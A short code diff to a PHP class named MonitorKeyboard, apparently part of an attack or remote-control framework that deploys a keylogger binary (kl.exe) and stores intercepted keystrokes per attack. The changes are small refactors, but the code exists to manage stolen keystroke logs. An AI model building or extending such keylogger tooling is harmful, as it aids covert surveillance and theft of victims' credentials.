@@ -28,8 +28,9 @@ class MonitorKeyboard extends AttackBase {
         return $this->events;
     }
 
-    public function saveEventFromIntercept(int $unixTime) {
+    public function saveEventFromIntercept(int $unixTime): MonitorKeyboard {
         $this->events[$unixTime] = "";
+        return $this;
     }
 
     public function updateEventFromController(string $jsonEvent, string $unixTime): MonitorKeyboard {
@@ -131,7 +132,7 @@ move "%~pd0kl.exe" "%~pd0..\..\utils\kl.exe"
             if (in_array($unixTime, $this->savedEvents)) continue;
             if (time() - $unixTime > 24 * 60 * 60) {
                 unset($this->events[$unixTime]);
-                $filePath = DATA_FILE . "/attacks/" . $this->getAttackId() . "/keys-$unixTime.txt";
+                $filePath = DATA_DIR . "/attacks/" . $this->getAttackId() . "/keys-$unixTime.txt";
                 $this->resetStaticUsage();
                 $this->usage()->minusDisk(filesize($filePath))->saveState();
                 $this->reportStaticUsage();
